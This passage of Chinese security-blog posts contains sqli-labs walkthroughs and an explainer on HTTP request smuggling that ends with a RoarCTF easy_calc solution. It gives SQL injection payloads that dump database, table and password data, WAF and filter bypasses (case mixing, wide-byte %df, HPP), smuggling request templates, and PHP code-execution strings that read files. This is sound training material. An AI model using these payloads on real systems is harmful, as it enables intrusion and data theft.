然后，可以进行明注：联合查询注入、报错注入，也可以进行盲注。这里我使用%a0代替空格(这里测试下爆库)。试了若干次。。。发现Windows下无法使用这些特殊字符来替换空格。那就用linux(我用的ubantu)吧。。。 id=0&#39;%a0union%a0select%a02,database(),&#39;3 Less-26a(过滤注释和空格的盲注)与Less-26相比，闭合方式变为&#39;)，且不会显示报错语句Less-27(过滤union和select)标题说过滤了union和select，我测试后发现还过滤了空格和注释。并且测试发现是单引号闭合为了更加清楚的知道过滤了什么，查看源码 function blacklist($id) { $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out --. $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out #. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/union/s&#39;,&quot;&quot;, $id); //Strip out union $id= preg_replace(&#39;/select/s&#39;,&quot;&quot;, $id); //Strip out select $id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id); //Strip out UNION $id= preg_replace(&#39;/SELECT/s&#39;,&quot;&quot;, $id); //Strip out SELECT $id= preg_replace(&#39;/Union/s&#39;,&quot;&quot;, $id); //Strip out Union $id= preg_replace(&#39;/Select/s&#39;,&quot;&quot;, $id); //Strip out select return $id; } 模式修正符根据过滤代码，发现大小写类似SelEct，没被过滤。所以大小写绕过即可 id=0&#39;%a0UnIon%a0SelEct%a02,database(),&#39;3 Less-27a(过滤union和select的盲注)与Less-27相比，不会显示报错语句，闭合方式变成双引号闭合。闭合方式判断：and 1=1双引号显示正确，and 1=0双引号显示错误。可以大致确定是双引号闭合。Less-28(有括号的单引号字符型，过滤union和select等)与Less-27相比，闭合方式变成&#39;)闭合。看下源码 function blacklist($id) { $id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out --. $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out #. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. //$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/union\\s+select/i&#39;,&quot;&quot;, $id); //Strip out UNION &amp; SELECT. return $id; } Less-28a(有括号的单引号字符型，过滤union和select等的盲注)和Less-28相同。。。看下源码 function blacklist($id) { //$id= preg_replace(&#39;/[\\/\\*]/&#39;,&quot;&quot;, $id); //strip out /* //$id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id); //Strip out --. //$id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id); //Strip out #. //$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. //$id= preg_replace(&#39;/select/m&#39;,&quot;&quot;, $id); //Strip out spaces. //$id= preg_replace(&#39;/[ +]/&#39;,&quot;&quot;, $id); //Strip out spaces. $id= preg_replace(&#39;/union\\s+select/i&#39;,&quot;&quot;, $id); //Strip out spaces. return $id; } 发现与Less-28相比，很多过滤还被注释了。如果把注释去掉，基本上过滤了所有字符，但是，所有的一次性过滤都能用双写绕过。当然也可以用盲注。 三、WAF绕过注入(Less-29-Less-31)了解一下WAFWAFMYSQL注入天书之服务器两层架构在SQL注入过程中主流的WAF绕过技术： 1.转换特征字符大小写2.利用注释绕过3.编码特征字符绕过4.分隔重写特征字符绕过5.利用截断字符绕过6.变换变量位置绕过7.针对域名保护的绕近8.超大数据包绕过9.转换数据提交方式绕过10.HPP（HTTP参数污染）绕过 ?id=1&amp;id=2 apache(php)解析最后一个参数，即显示id=2的内容。Tomcat(jsp)解析第一个参数，即显示id=1的内容。Tomcat功能类似一个WAF所以我们要传入两个id，第一个用来欺骗waf，第二个用来传送给apache。Less-29(基于WAF的一个错误)测试后发现是单引号闭合。并且没有过滤注释，空格，引号，unsion，select，and，or。所以尝试直接测试 id=1&#39; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+ 直接报错注入成功。。。。还是再试下吧！于是又试了下联合查询注入 id=0&#39; union select 1,database(),3 --+ 依旧成功。。。。最后再试试linux系统下的。。。依旧成功。。。。Less-30(基于错误的GET型双引号字符型注入)测试后发现是双引号闭合，将 Less-29的payload的&#39;换成&quot; id=0” union select 1,database(),3 --+ 发现失败了。于是看了下Less-29的标题和Less-30的标题。发现应该涉及了WAF。查看源码，发现WAF在login.php里 //WAF implimentation with a whitelist approach..... only allows input to be Numeric. //使用白名单方法实现WAF。。。。。只允许输入为数字 function whitelist($input) { $match = preg_match(&quot;/^\\d+$/&quot;, $input); if($match) { //echo &quot;you are good&quot;; //return $match; } else { header(&#39;Location: hacked.php&#39;); //echo &quot;you are bad&quot;; } } // The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution). //当受到HPP（HTTP参数污染）时，下面的函数将模拟参数的行为 function java_implimentation($query_string) { $q_s = $query_string; $qs_array= explode(&quot;&amp;&quot;,$q_s); foreach($qs_array as $key =&gt; $value) { $val=substr($value,0,2); if($val==&quot;id&quot;) { $id_value=substr($value,3,30); return $id_value; echo &quot;&lt;br&gt;&quot;; break; } } } 所以waf是只允许输入数字的，我们在输入数字的时候先给waf看然后检测正常后才转发给我们需要访问的页面。然后模拟了HTTP参数污染时，参数的行为。所以应该可以用HTTP参数污染绕过。这里就不详细分析了。参考飘零师傅的分析即可。payload id=1&amp;id=0&quot; union select 1,2,database() --+ Less-31(Protection with WAF用WAF防护)闭合方式为&quot;)，解法参照Less-30 四、宽字节注入(Less-32-Less-38)相关概念 单字节字符集： 所有的字符都使用一个字节来表示，比如 ASCII 编码。多字节字符集： 在多字节字符集中，一部分字节用多个字节来表示，另一部分（可能没有）用单个字节来表示。两位的多字节字符有一个前导字节和尾字节。 在某个多字节字符集内，前导字节位于某个特定范围内，尾字节也一样。UTF-8 编码： 是一种编码的编码方式（多字节编码），它可以使用1~4个字节表示一个符号，根据不同的符号而变化字节长度。常见的宽字节： GB2312、GBK、GB18030、BIG5、Shift_JIS GB2312 前提条件要有宽字节注入漏洞 首先要满足目标程序使用双/多字节字符集进行解析 其次不同字符集范围不一样，可能低位不包含单字节字符集的字符，这样就没办法了，所以要保证在该种字符集范围中包含低字节位，比如 0x5C(01011100) 的字符，即转义符\\。 原理宽字节（两字节）带来的安全问题主要是吃ASCII字符（一字节）的现象，使用一些特殊字符来”吃掉“经过转义符 “ \\ ” 。注意 宽字节不只是出现在GBK编码，在PHP中，通过iconv()进行编码转换时，也可能出现宽字节注入。 这里所说的编码问题不是出现在HTML页面编码，而是与数据库的编码形式有关，一般我们在建立一个数据库的时候会让我们选择数据库的编码形式，所以有时候网站虽然是UTF-8写的，但是如果数据库是GBK的形式，也会出现宽字节。 MySQL中用于转义的函数 addslashes、mysql_real_escape_string、mysql_escape_string以及后面在高版本被去除的magic_quote_gpc 绕过方法因为宽字节注入主要是吃掉 \\ ，所以一般时候加一个 %df 这种就可以吃掉，其实加三个%df也可以吃掉，只要是奇数个%df即可。Less-32(绕过addslashes())测试后发现单引号双引号都不会报错,并且被\\转义了，所以可以用宽字节注入%df&#39;报错。&#39;被加上反斜杠\\，变成了 %df\\’，其中\\的十六进制是 %5C 所以 %df\\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是運&#39;，即%df\\’ = %df%5c%27=運&#39; 然后再测试，发现是单引号闭合。于是试了下爆库 id=0%df&#39; union select 1,2,database() --+ Less-33跟less-32多大区别，宽字节注入即可。Less-34(绕过添加斜杠)POST型的宽字节。 uname=0%df&#39; union select 1,database()#&amp;passwd=&amp;submit=Submit Less-35整型注入,不需要闭合 id=0 union select 1,2,database() --+ Less-36查看源码，用了函数mysql_real_escape_string()，转义成功返回这些字符串，失败返回false。宽字节注入，参考Less-32Less-37Less-34一样，只是过滤函数不同，使用函数mysql_real_escape_string()Less-38参考Less-32 后记Page-这次又收获了一些注入方法：二次注入、GET型过滤敏感关键字注入、WAF绕过注入、宽字节注入。继续努力。。","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"SQL注入","slug":"漏洞原理/SQL注入","permalink":"https://qwzf.github.io/categories/漏洞原理/SQL注入/"}],"tags":[{"name":"靶场练习","slug":"靶场练习","permalink":"https://qwzf.github.io/tags/靶场练习/"},{"name":"二次注入","slug":"二次注入","permalink":"https://qwzf.github.io/tags/二次注入/"},{"name":"过滤敏感关键字与WAF绕过","slug":"过滤敏感关键字与WAF绕过","permalink":"https://qwzf.github.io/tags/过滤敏感关键字与WAF绕过/"},{"name":"宽字节注入","slug":"宽字节注入","permalink":"https://qwzf.github.io/tags/宽字节注入/"}],"author":"qwzf"},{"title":"sqli-labs攻关3(Less-11_Less-22)","slug":"sqli-labs攻关3(Less-11-Less-22)","date":"2019-11-06T15:55:21.000Z","updated":"2020-08-01T16:56:08.285Z","comments":true,"path":"2019/11/06/sqli-labs攻关3(Less-11-Less-22)/","link":"","permalink":"https://qwzf.github.io/2019/11/06/sqli-labs攻关3(Less-11-Less-22)/","excerpt":"","text":"前言好久没打sqli-labs了，闲来无事继续打一下。 一、联合查询-POST型Less-11 &#39;1.注入点判断 uname=admin\\&amp;passwd=&amp;submit=Submit 通过添加反斜杠\\，得知是&#39;闭合注入测试 uname=admin&#39; or &#39;a&#39;=&#39;a&amp;passwd=1&amp;submit=Submit 或 uname=admin&#39; and 1=1#&amp;passwd=&amp;submit=Submit 2.显示位判断 uname=不存在的用户&#39; union select 1,2 #&amp;passwd=&amp;submit=Submit 显示位有1、2两处3.获取所有数据库名 uname=1&#39; union select 1,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#&amp;passwd=&amp;submit=Submit 获取当前数据库名 uname=1&#39; union select database(),2 #&amp;passwd=&amp;submit=Submit 4.获取所有数据表名 uname=1&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&amp;passwd=&amp;submit=Submit 4.获取所有字段名 uname=1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;#&amp;passwd=&amp;submit=Submit 5.获取所有数据 uname=1&#39; union select 1,group_concat(password) from users#&amp;passwd=&amp;submit=Submit Less-12 &quot;)注入点判断通过添加反斜杠\\，得知是&quot;)闭合注入测试 uname=admin&quot;) or (&quot;a&quot;=&quot;a&amp;passwd=1&amp;submit=Submit 或 uname=admin&quot;) and 1=1#&amp;passwd=1&amp;submit=Submit 爆数据库、数据表、字段、记录和Less-11类似。 二、报错注入POST型因为总结过，所以这里不再总结。CSDN报错注入或个人博客报错注入 Less-13 &#39;)注入点判断通过添加反斜杠\\，得知是&#39;)闭合。进行其它注入操作时，发现没有回显。而加反斜杠测试闭合方式却有回显，因为产生报错。于是想到进行其它注入操作时，应该可以使用报错注入(这里暂且使用Xpath注入，也可以使用其它报错注入方式)。爆数据库 uname=1&#39;) and (updatexml(1,concat(0x7e,(select database()),0x7e),1))#&amp;passwd=&amp;submit=Submit 爆表 uname=1&#39;) and (updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1))#&amp;passwd=&amp;submit=Submit 爆字段 uname=1&#39;) and (updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&quot;users&quot;),0x7e),1))#&amp;passwd=&amp;submit=Submit 爆数据 uname=1&#39;) and (updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1))#&amp;passwd=&amp;submit=Submit Less-14 &quot;通过添加反斜杠\\，得知是&quot;闭合其它注入操作，把Less-13的&#39;)改为&quot;即可。 三、盲注POST型Less-15post传入 uname=admin\\&amp;passwd=&amp;submit=Submit 通过添加反斜杠\\，没有回显闭合方式，只回显了登录失败页面。尝试万能语句 &#39; or 1=1# 登录成功。发现登录成功和登录失败回显不同。于是想到了另一种思路来做，即SQL盲注，并且是POST型的布尔盲注，因为之前总结过GET型的SQL盲注，还做了几道POST盲注的题。所以这里不再详细总结。CSDN：sqli-labs攻关2(布尔盲注、时间盲注)或个人博客sqli-labs攻关2(布尔盲注、时间盲注)先知社区：SQL盲注的简单分析 测试测闭合方式 uname=admin&#39;#&amp;passwd=&amp;submit=Submit 单引号闭合 测长度 uname=admin&#39; and (length(database())=8)#&amp;passwd=&amp;submit=Submit 数据库长度为8测字符 uname=admin&#39; and (ascii(substr(database(),1,1))&gt;97)#&amp;passwd=&amp;submit=Submit 说明数据库第一个字符ASCII码大于97 具体注入步骤，参考SQL盲注的简单分析 Less-16依旧是SQL盲注，与Less-15相比，闭合方式由&#39;变成了&quot;) 当然，布尔盲注的题可以用时间盲注的方法来做，只不过时间盲注效率有点低。 四、POST注入1、基于错误POST更新查询注入过滤函数：check_input()Less-17查看源码发现，check_input()对传入的uname进行了限制 ，只能16个字符。调用了get_magic_quotes_gpc() 将 &#39; &quot; 空格 / 进行了转义。却没有对passwd进行任何处理。 所以与Less-14相比，注入点不在uname，注入点在passwd。测试发现闭合方式为&#39;。这里测试个爆数据库的。爆库 uname=admin&amp;passwd=1&#39; or updatexml(1,concat(0x7e,database(),0x7e),1)#&amp;submit=Submit 但当我测试到爆数据时，却没爆出来，回显信息为： You can&#39;t specify target table &#39;users&#39; for update in FROM clause 查询百度和大师傅博客，发现解决方法：在外面加一层select即可解决。payload uname=admin&amp;passwd=&#39; or updatexml(1,concat(0x7e,(select username from (select username from users)b limit 0,1),0x7e),1)#&amp;submit=Submit 2、User-Agent注入很多网站都会记录用户的User-Agent， 这为注入提供了条件。注入原理后台在接收UA时没有对UA做过滤，也没有PDO进行数据交互（实际PDO是非常有必要的），导致UA中有恶意代码，最终在数据库中执行。Less-18登录框输入admin 123，登录失败只有如下信息输入admin admin，登录成功返回如下信息猜测应该是在User-Agent进行注入。于是FireFox + Burp或Firefox+hackbar插件。测注入点 User-Agent: 1&#39; 报错回显发现这里果然存在注入。测闭合方式 User-Agent: 1&#39; and &#39;1&#39;=&#39;1 回显发现是&#39;闭合方式。于是开始其它注入操作爆库 User-Agent: 1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1 爆表、爆字段、爆数据，后面的和Less-13大致一样，不再测试。 3、Referer注入Less-19先登录，登录成功，得到回显：猜测应该是在header里的Referer里进行注入测注入点 Referer: 1&#39; 测闭合方式 Referer: 1&#39; and &#39;1&#39;=&#39;1 爆库 Referer: 1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1 其它注入操作和Less-18类似。 4、Cookie注入Less-20和上两道题一个路数，先登录，得到回显猜测应该是在header里的Cookie里进行注入测注入点 Cookie: uname=admin&#39; 测闭合方式 Cookie: uname=admin&#39; and &#39;1&#39;=&#39;1 爆库 Cookie: uname=admin&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1 Less-21登录，发现Cookie中为base64，解码得到admin猜想只是比Less-20多了一个Base64对admin&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1进行base64编码。 Cookie: uname=YWRtaW4nIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxkYXRhYmFzZSgpLDB4N2UpLDEpIGFuZCAnMSc9JzE= 测试，得到数据库Less-22把Less-21单引号改为双引号。即对admin&quot; and updatexml(1,concat(0x7e,database(),0x7e),1) and &quot;1&quot;=&quot;1进行base64编码。 后记至此，总算把Page-1的SQL注入关卡打完了。总的来说，22个sqli-labs关卡主要涉及的SQL注入的姿势有： GET型错误型注入、联合查询注入、报错注入、盲注、导出文件注入 POST型联合查询注入、报错注入、盲注 POST注入","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"SQL注入","slug":"漏洞原理/SQL注入","permalink":"https://qwzf.github.io/categories/漏洞原理/SQL注入/"}],"tags":[{"name":"靶场练习","slug":"靶场练习","permalink":"https://qwzf.github.io/tags/靶场练习/"},{"name":"POST型联合查询注入","slug":"POST型联合查询注入","permalink":"https://qwzf.github.io/tags/POST型联合查询注入/"},{"name":"POST型报错注入","slug":"POST型报错注入","permalink":"https://qwzf.github.io/tags/POST型报错注入/"},{"name":"POST型盲注","slug":"POST型盲注","permalink":"https://qwzf.github.io/tags/POST型盲注/"}],"author":"qwzf"},{"title":"从一道题到HTTP请求走私","slug":"从一道题到HTTP请求走私","date":"2019-10-27T15:13:44.723Z","updated":"2020-08-01T16:50:13.224Z","comments":true,"path":"2019/10/27/从一道题到HTTP请求走私/","link":"","permalink":"https://qwzf.github.io/2019/10/27/从一道题到HTTP请求走私/","excerpt":"","text":"0x00 写在前面首发在先知社区 之前一次线上赛，遇到一道Web题，涉及了HTTP请求走私。由于之前未学习过，从而我展开了HTTP请求走私的学习之旅。 0x01 HTTP请求走私是什么HTTP请求走私是一种干扰网站处理从一个或多个用户接收的HTTP请求序列的方式的技术。使攻击者可以绕过安全控制，未经授权访问敏感数据并直接危害其他应用程序用户。 0x02 为什么会产生HTTP请求走私请求走私漏洞成因 前端服务器(CDN)和后端服务器接收数据不同步，引起对客户端传入的数据理解不一致，从而导致漏洞的产生。 大多数HTTP请求走私漏洞的出现是因为HTTP规范提供了两种不同的方法来指定请求的结束位置：Content-Length标头和Transfer-Encoding标头。同时使用两种不同的方法时，Content-Length无效。当使用多个服务器时，对客户端传入的数据理解不一致时，就会出现有些服务器认为Content-Length的长度有效，有些以Transfer-Encoding有效。而一般情况下，反向代理服务器与后端的源站服务器之间，会重用TCP链接。这样超出的长度就会拼接到下一次请求进行请求，从而导致HTTP请求走私漏洞。 RFC2616规范 如果接收的消息同时包含传输编码头字段(Transfer-Encoding)和内容长度头(Content-Length)字段，则必须忽略后者。 由于规范默许可以使用Transfer-Encoding和Content-Length处理请求，因此很少有服务器拒绝此类请求。每当我们找到一种方法，将Transfer-Encoding隐藏在服务端的一个chain中时，它将会回退到使用Content-Length去发送请求。 走私攻击实现当向代理服务器发送一个比较模糊的HTTP请求时，由于两者服务器的实现方式不同，代理服务器可能认为这是一个HTTP请求，然后将其转发给了后端的源站服务器，但源站服务器经过解析处理后，只认为其中的一部分为正常请求，剩下的那一部分，就算是走私的请求，当该部分对正常用户的请求造成了影响之后，就实现了HTTP走私攻击。 扩展：为什么会出现多次请求这与最为广泛的HTTP 1.1的协议特性——Keep-Alive&amp;Pipeline有关。在HTTP1.0之前的协议设计中，客户端每进行一次HTTP请求，需要同服务器建立一个TCP链接。而现代的Web页面是由多种资源组成的，要获取一个网页的内容，不仅要请求HTML文档，还有JS、CSS、图片等各种资源，如果按照之前的协议设计，就会导致HTTP服务器的负载开销增大。于是在HTTP1.1中，增加了Keep-Alive和Pipeline这两个特性。 Keep-Alive：在HTTP请求中增加一个特殊的请求头Connection: Keep-Alive，告诉服务器，接收完这次HTTP请求后，不要关闭TCP链接，后面对相同目标服务器的HTTP请求，重用这一个TCP链接。这样只需要进行一次TCP握手的过程，可以减少服务器的开销，节约资源，还能加快访问速度。这个特性在HTTP1.1中默认开启的。Pipeline(http管线化)：http管线化是一项实现了多个http请求但不需要等待响应就能够写进同一个socket的技术，仅有http1.1规范支持http管线化。在这里，客户端可以像流水线一样发送自己的HTTP请求，而不需要等待服务器的响应，服务器那边接收到请求后，需要遵循先入先出机制，将请求和响应严格对应起来，再将响应发送给客户端。 现在，浏览器默认不启用Pipeline的，但是一般的服务器都提供了对Pipleline的支持。下面这是典型的CDN加速图和拓扑结构图CDN加速图拓扑结构图 0x03 如何执行HTTP请求走私攻击HTTP请求走私攻击涉及将Content-Length标头和Transfer-Encoding标头都放置在单个HTTP请求中并进行处理，以便前端服务器和后端服务器以不同的方式处理请求。完成此操作的确切方式取决于两个服务器的行为： CL.TE：前端服务器使用Content-Length标头，而后端服务器使用Transfer-Encoding标头。TE.CL：前端服务器使用Transfer-Encoding标头，而后端服务器使用Content-Length标头。TE.TE：前端服务器和后端服务器都支持Transfer-Encoding标头，但是可以通过对标头进行某种方式的混淆来诱导其中一台服务器不对其进行处理。 0x04 HTTP请求走私攻击的五种方式CL不为0所有不携带请求体的HTTP请求都有可能受此影响。这里用GET请求举例。前端代理服务器允许GET请求携带请求体；后端服务器不允许GET请求携带请求体，它会直接忽略掉GET请求中的Content-Length头，不进行处理。这就有可能导致请求走私。 构造请求示例： GET / HTTP/1.1\\r\\n Host: test.com\\r\\n Content-Length: 44\\r\\n GET / secret HTTP/1.1\\r\\n Host: test.com\\r\\n \\r\\n \\r\\n是换行的意思，windows的换行是\\r\\n，unix的是\\n，mac的是\\r 攻击流程：前端服务器收到该请求，读取Content-Length，判断这是一个完整的请求。然后转发给后端服务器，后端服务器收到后，因为它不对Content-Length进行处理，由于Pipeline的存在，后端服务器就认为这是收到了两个请求，分别是： 第一个： GET / HTTP/1.1\\r\\n Host: test.com\\r\\n 第二个： GET / secret HTTP/1.1\\r\\n Host: test.com\\r\\n 所以造成了请求走私。 CL-CLRFC7230规范 在RFC7230的第3.3.3节中的第四条中，规定当服务器收到的请求中包含两个Content-Length，而且两者的值不同时，需要返回400错误。 有些服务器不会严格的实现该规范，假设中间的代理服务器和后端的源站服务器在收到类似的请求时，都不会返回400错误。但是中间代理服务器按照第一个Content-Length的值对请求进行处理，而后端源站服务器按照第二个Content-Length的值进行处理。构造请求示例： POST / HTTP/1.1\\r\\n Host: test.com\\r\\n Content-Length: 8\\r\\n Content-Length: 7\\r\\n 12345\\r\\n a 攻击流程：中间代理服务器获取到的数据包的长度为8，将上述整个数据包原封不动的转发给后端的源站服务器。而后端服务器获取到的数据包长度为7。当读取完前7个字符后，后端服务器认为已经读取完毕，然后生成对应的响应，发送出去。而此时的缓冲区去还剩余一个字母a，对于后端服务器来说，这个a是下一个请求的一部分，但是还没有传输完毕。如果此时有一个其他的正常用户对服务器进行了请求： GET /index.html HTTP/1.1\\r\\n Host: test.com\\r\\n 因为代理服务器与源站服务器之间一般会重用TCP连接。所以正常用户的请求就拼接到了字母a的后面，当后端服务器接收完毕后，它实际处理的请求其实是： aGET /index.html HTTP/1.1\\r\\n Host: test.com\\r\\n 这时，用户就会收到一个类似于aGET request method not found的报错。这样就实现了一次HTTP走私攻击，而且还对正常用户的行为造成了影响，而且还可以扩展成类似于CSRF的攻击方式。 但是一般的服务器都不会接受这种存在两个请求头的请求包。该怎么办呢？所以想到前面所说的RFC2616规范 如果收到同时存在Content-Length和Transfer-Encoding这两个请求头的请求包时，在处理的时候必须忽略Content-Length。 所以请求包中同时包含这两个请求头并不算违规，服务器也不需要返回400错误。导致服务器在这里的实现更容易出问题。 CL-TECL-TE，就是当收到存在两个请求头的请求包时，前端代理服务器只处理Content-Length请求头，而后端服务器会遵守RFC2616的规定，忽略掉Content-Length，处理Transfer-Encoding请求头。 chunk传输数据(size的值由16进制表示) [chunk size][\\r\\n][chunk data][\\r\\n][chunk size][\\r\\n][chunk data][\\r\\n][chunk size = 0][\\r\\n][\\r\\n] chunked编码参考：http协议中content-length 以及chunked编码分析构造请求示例： POST / HTTP/1.1\\r\\n Host: test.com\\r\\n ...... Connection: keep-alive\\r\\n Content-Length: 6\\r\\n Transfer-Encoding: chunked\\r\\n \\r\\n 0\\r\\n \\r\\n a 连续发送几次请求就可以获得响应。攻击流程：由于前端服务器处理Content-Length，所以这个请求对于它来说是一个完整的请求，请求体的长度为6，也就是 0\\r\\n \\r\\n a 当请求包经过代理服务器转发给后端服务器时，后端服务器处理Transfer-Encoding，当它读取到 0\\r\\n \\r\\n 认为已经读取到结尾了。但剩下的字母a就被留在了缓冲区中，等待下一次请求。当我们重复发送请求后，发送的请求在后端服务器拼接成了类似下面这种请求： aPOST / HTTP/1.1\\r\\n Host: test.com\\r\\n ...... 服务器在解析时就会产生报错了，从而造成HTTP请求走私。 TE-CLTE-CL，就是当收到存在两个请求头的请求包时，前端代理服务器处理Transfer-Encoding请求头，后端服务器处理Content-Length请求头。构造请求示例： POST / HTTP/1.1\\r\\n Host: test.com\\r\\n ...... Content-Length: 4\\r\\n Transfer-Encoding: chunked\\r\\n \\r\\n 12\\r\\n aPOST / HTTP/1.1\\r\\n \\r\\n 0\\r\\n \\r\\n 攻击流程：前端服务器处理Transfer-Encoding，当其读取到 0\\r\\n \\r\\n 认为是读取完毕了。此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器，后端服务器处理Content-Length请求头，因为请求体的长度为4.也就是当它读取完 12\\r\\n 就认为这个请求已经结束了。后面的数据就认为是另一个请求： aPOST / HTTP/1.1\\r\\n \\r\\n 0\\r\\n \\r\\n 成功报错，造成HTTP请求走私。 TE-TETE-TE，当收到存在两个请求头的请求包时，前后端服务器都处理Transfer-Encoding请求头，确实是实现了RFC的标准。不过前后端服务器不是同一种。这就有了一种方法，我们可以对发送的请求包中的Transfer-Encoding进行某种混淆操作(如某个字符改变大小写)，从而使其中一个服务器不处理Transfer-Encoding请求头。在某种意义上这还是CL-TE或者TE-CL。构造请求示例： POST / HTTP/1.1\\r\\n Host: test.com\\r\\n ...... Content-length: 4\\r\\n Transfer-Encoding: chunked\\r\\n Transfer-encoding: cow\\r\\n \\r\\n 5c\\r\\n aPOST / HTTP/1.1\\r\\n Content-Type: application/x-www-form-urlencoded\\r\\n Content-Length: 15\\r\\n \\r\\n x=1\\r\\n 0\\r\\n \\r\\n 攻击流程：前端服务器处理Transfer-Encoding，当其读取到 0\\r\\n \\r\\n 认为是读取结束。此时这个请求对代理服务器来说是一个完整的请求，然后转发给后端服务器处理Transfer-encoding请求头，将Transfer-Encoding隐藏在服务端的一个chain中时，它将会回退到使用Content-Length去发送请求。读取到 5c\\r\\n 认为是读取完毕了。后面的数据就认为是另一个请求： aPOST / HTTP/1.1\\r\\n Content-Type: application/x-www-form-urlencoded\\r\\n Content-Length: 15\\r\\n \\r\\n x=1\\r\\n 0\\r\\n \\r\\n 成功报错，造成HTTP请求走私。 0x05 HTTP请求走私实战在我学HTTP请求走私之前，正是因为碰到一道Web题要使用HTTP请求走私。现在复现一下 RoarCTF2019-Web：easy_calc进去发现是个计算器这道题是国赛的love_math的修改版。国赛题love_math参考Smi1e师傅的Writeup：国赛love_math题解输入calc.php，发现了网站源码这道题除去了长度限制，payload中不能包含 ‘ ‘, ‘\\t’, ‘\\r’, ‘\\n’,’’’, ‘“‘, ‘`‘, ‘[‘, ‘]’等字符 师傅的Writeup还说网站加了waf，需要绕过waf。所以还需要绕过waf，测试发现当我们提交一些字符时，会直接403。403？！应该就是走私报错了，经测试发现的确存在服务器存在http走私漏洞，可以用来绕waf。 因禁了一些字符，所以不能直接getflag，需要继续分析payload构造。 相关PHP函数scandir() 函数返回指定目录中的文件和目录的数组。base_convert() 函数在任意进制之间转换数字。dechex() 函数：把十进制转换为十六进制。hex2bin() 函数：把十六进制值的字符串转换为 ASCII 字符。readfile() 函数输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。 HTTP走私绕过WAF测试示例1、HTTP请求走私测试2(CL-CL漏洞)两个CL直接导致前端转发的服务器400，而且完整转发了post包给后端。2、HTTP请求走私测试1(CL-TE漏洞)CL和TE直接导致前端转发的服务器400，而且完整转发了post包给后端。其它几种请求走私依旧可以，就不测试了。 构造payload获得Flag使用scandir()函数、readfile()函数、base_convert()函数、dechex() 函数、hex2bin() 函数（chr()函数）36进制scandir-&gt;10进制6169338629136进制readfile-&gt;10进制2146934604002ascii码/-&gt;16进制2f-&gt;10进制4736进制f1agg-&gt;10进制25254448(读取根目录得到的)1、列目录首先要使用scandir()函数，尝试构造payload列举根目录下的文件。scandir()可以用base_convert()函数构造，但是利用base_convert()只能解决a~z的利用。因为根目录需要/符号，且不在a~z,所以需要hex2bin(dechex(47))这种构造方式，dechex() 函数把十进制数转换为十六进制数。hex2bin() 函数把十六进制值的字符串转换为 ASCII 字符。当然，也可以直接用chr()函数 payload var_dump(base_convert(61693386291,10,36)(chr(47))) 2、读取flag payload var_dump(base_convert(2146934604002,10,36)(chr(47).base_convert(25254448,10,36))) PHP字符串解析特性绕过WAF输入时发现num只能输入数字，输入字符无法解析。这里可以利用php的字符串解析特性绕过bypass：利用PHP的字符串解析特性Bypass PHP需要将所有参数转换为有效的变量名，因此在解析查询字符串时，它会做两件事：1.删除空白符2.将某些字符转换为下划线（包括空格） 所以我们可以在num前加个空格绕过waf http://www.xxx.com/index.php? num=aaaa 现在的变量叫“ num”，而不是“num”。但php在解析的时候，会先把空格给去掉，这样代码还能正常运行，还上传了非法字符。然后再利用scandir()函数，列出 参数目录 中的文件和目录。首先，要先扫根目录下的所有文件，也就是是scandir(&quot;/&quot;),因为/被过滤了，所以直接用chr(“47”)绕过,发现flagg文件然后再去读取这个文件就行了。payload： calc.php? num=1;var_dump(readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) 0x06 漏洞修复1、将前端服务器配置为只使用HTTP/2与后端系统通信2、完全禁用后端连接重用来解决此漏洞的所有变体3、确保连接中的所有服务器运行具有相同配置的相同web服务器软件。4、彻底拒绝模糊的请求，并删除关联的连接。5、在Burp 